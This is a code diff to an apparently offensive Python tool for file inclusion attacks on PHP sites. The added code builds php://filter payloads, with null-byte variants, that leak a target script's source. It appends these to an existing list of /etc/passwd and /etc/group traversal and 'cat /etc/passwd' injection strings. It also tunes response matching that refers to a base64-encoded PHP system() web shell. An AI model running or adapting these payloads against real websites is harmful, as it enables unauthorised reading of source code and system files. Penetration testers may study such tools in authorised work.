@@ -17,6 +17,7 @@ import socketserver
 import traceback
 import errno
 import fileinput
+import urllib.parse as urlparse
 
 from contextlib import closing
 from argparse import RawTextHelpFormatter
@@ -24,6 +25,7 @@ from argparse import RawTextHelpFormatter
 exploits = []
 proxies = {}
 rfi_test_port = 443
+scriptName = ""
 
 class ServerHandler(http.server.SimpleHTTPRequestHandler):
     def log_message(self, format, *args):
@@ -104,8 +106,10 @@ def init(req, reqType, explType, getVal, postVal, headers, attackType):
                   "file%3A%2F%2F%2Fetc%2Fpasswd", "cat%20/etc/passwd", "cat%20/etc/group",
                   "///etc/passwd", "/etc/passwd", "file%3A%2F%2F%2Fetc%2Fgroup%2500", 
                   "file%3A%2F%2F%2Fetc%2Fgroup", "file://etc/group%00", "file:///etc/group", 
-                  "/etc/group","https://www.google.com/", "rfitest.txt", "ipconfig"]
-   
+                  "/etc/group","https://www.google.com/", "rfitest.txt", "ipconfig",
+                  scriptName, scriptName+".php", scriptName+"%00"]
+    
+
     if(checkPayload(req)):
         for i in range(len(TO_REPLACE)):
             if(getVal.find(TO_REPLACE[i]) > -1 or postVal.find(TO_REPLACE[i]) > -1 or getVal.find("?c=" + TO_REPLACE[i]) > -1):
@@ -244,6 +248,8 @@ def test_xss(url):
 def test_filter(url):
     if(args.verbose):
         print("Testing filter wrapper...")
+    
+    global scriptName
 
     tests = []
     tests.append("php://filter/resource=/etc/passwd")
@@ -265,7 +271,17 @@ def test_filter(url):
     tests.append("php://filter/convert.base64-encode/resource=C:/Windows/System32/drivers/etc/hosts%00")
     tests.append("php://filter/read=string.rot13/resource=C:/Windows/System32/drivers/etc/hosts")
     tests.append("php://filter/read=string.rot13/resource=C:/Windows/System32/drivers/etc/hosts%00")
-   
+    
+    
+    script = os.path.splitext(os.path.basename(urlparse.urlsplit(url).path))
+    scriptName = script[0]
+    if(scriptName == ""):
+        scriptName = "index"
+
+    tests.append("php://filter/convert.base64-encode/resource=" + scriptName)
+    tests.append("php://filter/convert.base64-encode/resource=" + scriptName + ".php")
+    tests.append("php://filter/convert.base64-encode/resource=" + scriptName + "%00")
+
     if(not args.postreq):
         for i in range(len(tests)):
             if(args.param in url):
@@ -277,6 +293,7 @@ def test_filter(url):
             except ConnectionError:
                 print("Connection error has occurred...")
             except Exception as e:
+                #TODO
                 pass
     else:
         addHeader("Content-Type", "application/x-www-form-urlencoded")
@@ -469,10 +486,10 @@ def checkPayload(webResponse):
                 "; sbe 16-ovg ncc fhccbeg", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
                 ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
                 "c2FtcGxlIEhPU1RT", "=1943785348b45", "www-data:x",
-                "window.google=", "961bb08a95dbc34397248d92352da799"]
+                "window.google=", "961bb08a95dbc34397248d92352da799", "Pz4"]
 
-    for i in range(len(KEY_WORDS)):
-        if KEY_WORDS[i] in webResponse.text:
+    for word in KEY_WORDS:
+        if word in webResponse.text and "PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K" not in webResponse.text and ("Warning" not in webResponse.text and "include(" not in webResponse.text):
             return True
     return False
 
